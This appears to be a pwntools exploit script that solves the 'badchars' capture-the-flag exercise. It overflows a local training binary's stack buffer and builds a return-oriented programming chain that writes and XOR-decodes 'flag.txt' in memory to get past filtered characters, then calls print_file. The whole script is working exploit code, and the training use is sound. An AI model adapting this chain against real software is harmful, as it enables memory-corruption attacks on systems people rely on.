from pwn import *

bin = './badchars'
elf = ELF(bin)
p = process(bin)

offset = 40

# Gadgets
pop_r12_r13_r14_r15 = 0x40069c   # pop r12; pop r13; pop r14; pop r15; ret
mov_r12_to_r13      = 0x400634   # mov qword ptr [r13], r12; ret
pop_r14_r15         = 0x4006a0   # pop r14; pop r15; ret
xor_r15_r14         = 0x400628   # xor byte ptr [r15], r14b; ret
pop_rdi             = 0x4006a3   # pop rdi; ret

data = 0x601038  # writable section

badchars = [ord('x'), ord('g'), ord('a'), ord('.')]

# Step 1: XOR encode "flag.txt" to avoid badchars
plain = b"flag.txt"
key = None
encoded = None
for k in range(1, 256):
    enc = bytes([b ^ k for b in plain])
    if not any(c in badchars for c in enc):
        key = k
        encoded = enc
        break

assert key is not None
log.info(f"Using XOR key: {key:#x}")
log.info(f"Encoded string: {encoded}")


payload = b"A" * offset

# Step 2: Write the encoded string into memory using r12->r13
payload += p64(pop_r12_r13_r14_r15)
payload += p64(u64(encoded))  # r12 = encoded string
payload += p64(data)                 # r13 = destination address
payload += p64(0)                    # r14 (not used)
payload += p64(0)                    # r15 (not used)
payload += p64(mov_r12_to_r13)

# Step 3: Decode each byte in place using XOR (pop r14/r15)
for i in range(len(plain)):
    payload += p64(pop_r14_r15)
    payload += p64(key)          # r14b = XOR key
    payload += p64(data + i)     # r15 = address of encoded byte
    payload += p64(xor_r15_r14) # decode

# Step 4: Set up argument for print_file
payload += p64(pop_rdi)
payload += p64(data)  # rdi = pointer to decoded string

# Step 5: Call print_file
payload += p64(elf.plt['print_file'])
payload += p64(elf.symbols['main'])  # safe return

# Send the payload
p.sendafter(b'> ', payload)
output = p.recvall(timeout=2).decode()
print(output)
